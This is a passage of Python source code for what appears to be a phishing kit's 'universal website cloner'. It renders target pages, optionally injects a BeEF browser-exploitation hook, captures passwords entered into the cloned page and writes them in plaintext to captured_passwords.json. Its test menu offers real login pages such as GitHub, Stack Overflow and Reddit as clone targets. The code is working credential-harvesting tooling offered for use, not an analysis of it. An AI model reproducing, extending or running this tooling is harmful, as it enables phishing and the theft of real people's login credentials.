                content = await self.browser_manager.render_page_universal(url)
                if content:
                    # Try to get password data
                    password_data = self.browser_manager.get_captured_passwords()
                    if password_data:
                        logger.info(f"🔑 Universal password capture: {len(password_data.get('passwords', []))} entries")
                    return content
            except Exception as e:
                logger.debug(f"Browser rendering failed: {e}")
        
        # Fallback to HTTP request
        if self.resource_manager.session_pool:
            session = self.resource_manager.session_pool[0]
            try:
                async with session.get(url) as response:
                    if response.status == 200:
                        content = await response.read()
                        
                        # Try multiple encodings
                        for encoding in ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']:
                            try:
                                return content.decode(encoding)
                            except UnicodeDecodeError:
                                continue
                        
                        return content.decode('utf-8', errors='ignore')
                        
            except Exception as e:
                logger.error(f"HTTP request failed: {e}")
        
        return None
    
    async def _save_universal_metadata(self, url: str, output_dir: Path, start_time: float):
        """Save universal cloning metadata"""
        
        duration = time.time() - start_time
        
        metadata = {
            'universal_cloner_version': '1.0_final',
            'target_url': url,
            'clone_timestamp': time.time(),
            'clone_duration_seconds': duration,
            'stats': self.resource_manager.stats,
            'password_capture_enabled': self.config.capture_passwords_plaintext,
            'password_sessions': len(self.browser_manager.captured_passwords),
            'features_enabled': {
                'service_workers': self.config.discover_service_workers,
                'web_manifests': self.config.discover_web_manifests,
                'shadow_dom': self.config.process_shadow_dom,
                'lazy_loading': self.config.handle_lazy_loading
            }
        }
        
        # Save main metadata
        async with aiofiles.open(output_dir / 'clone_metadata.json', 'w') as f:
            await f.write(json.dumps(metadata, indent=2))
        
        # Save password data if any was captured
        if (self.browser_manager.captured_passwords and 
            self.config.save_captured_passwords):
            
            password_data = {
                'capture_timestamp': time.time(),
                'target_url': url,
                'capture_sessions': self.browser_manager.captured_passwords,
                'total_passwords': sum(len(session.get('passwords', [])) 
                                     for session in self.browser_manager.captured_passwords)
            }
            
            async with aiofiles.open(output_dir / 'captured_passwords.json', 'w') as f:
                await f.write(json.dumps(password_data, indent=2))
                
            logger.info(f"🔑 Universal password data saved: {password_data['total_passwords']} entries")
    
    async def _universal_cleanup(self):
        """Universal cleanup of all resources"""
        try:
            await self.resource_manager.cleanup()
            self.browser_manager.cleanup()
        except Exception as e:
            logger.debug(f"Cleanup failed: {e}")

# Universal Integration Functions
def sync_wrapper(coro):
    """Universal sync wrapper for async functions"""
    @wraps(coro)
    def wrapper(*args, **kwargs):
        try:
            loop = asyncio.get_event_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        try:
            if loop.is_running():
                # Use thread for nested event loops
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as executor:
                    future = executor.submit(asyncio.run, coro(*args, **kwargs))
                    return future.result()
            else:
                return loop.run_until_complete(coro(*args, **kwargs))
        except Exception as e:
            logger.error(f"Universal sync wrapper error: {e}")
            return False
    
    return wrapper

@sync_wrapper
async def clone_universal_async(url: str, user_agent: str, beef: str) -> bool:
    """Universal async clone function"""
    beef_enabled = beef.lower() == 'yes'
    
    config = UniversalClonerConfig()
    cloner = UniversalCloner(config)
    
    return await cloner.clone_website_universal(url, user_agent, beef_enabled)

def clone(url: str, user_agent: str, beef: str) -> bool:
    """
    UNIVERSAL website cloner - works with ANY website
    
    Args:
        url: Target URL to clone (any website)
        user_agent: User agent string from request
        beef: 'yes' or 'no' for BeEF hook injection
    
    Returns:
        bool: True if cloning successful, False otherwise
    """
    try:
        logger.info(f"🌍 UNIVERSAL CLONE REQUEST: {url}")
        logger.info(f"👤 User Agent: {user_agent[:50]}...")
        logger.info(f"🥩 BeEF Hook: {beef}")
        logger.info(f"🔑 Password Capture: ENABLED")
        
        # Universal cloning
        result = clone_universal_async(url, user_agent, beef)
        
        if result:
            logger.info("✅ UNIVERSAL cloning completed successfully")
        else:
            logger.error("❌ UNIVERSAL cloning failed")
        
        return result
        
    except Exception as e:
        logger.error(f"❌ UNIVERSAL clone error: {e}")
        return False

# Universal test function
if __name__ == "__main__":
    universal_test_sites = [
        ("https://github.com/login", "GitHub"),
        ("https://stackoverflow.com/users/login", "Stack Overflow"),
        ("https://www.reddit.com/login", "Reddit"),
        ("https://news.ycombinator.com/", "Hacker News"),
        ("https://www.wikipedia.org/", "Wikipedia"),
        ("https://example.com/", "Example Site"),
    ]
    
    test_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    
    print("🌍 Testing UNIVERSAL Website Cloner...")
    print("This cloner works with ANY website universally!")
    print("Select a site to test:")
    for i, (url, name) in enumerate(universal_test_sites, 1):
        print(f"{i}. {name} ({url})")
    
    try:
        choice = int(input("Enter choice (1-6) or custom URL: ")) - 1
        if 0 <= choice < len(universal_test_sites):
            test_url, site_name = universal_test_sites[choice]
            print(f"🚀 Testing UNIVERSAL clone of {site_name}...")
        else:
            test_url = input("Enter custom URL: ")
            site_name = "Custom Site"
            print(f"🚀 Testing UNIVERSAL clone of {site_name}...")
            
        result = clone(test_url, test_user_agent, "no")
        
        if result:
            print(f"🎉 UNIVERSAL clone of {site_name} completed successfully!")
            print("🔍 Check output directory for all cloned resources")
            print("🔑 Check logs for password capture data")
        else:
            print(f"❌ UNIVERSAL clone of {site_name} failed!")
            
    except (ValueError, KeyboardInterrupt):
        # Default universal test
        test_url = universal_test_sites[0][0]
        print(f"🚀 Running default UNIVERSAL test: {universal_test_sites[0][1]}...")
        result = clone(test_url, test_user_agent, "no")
        
        if result:
            print("🎉 UNIVERSAL test completed successfully!")
            print("🌍 This cloner can handle ANY website universally!")
        else:
            print("❌ UNIVERSAL test failed!")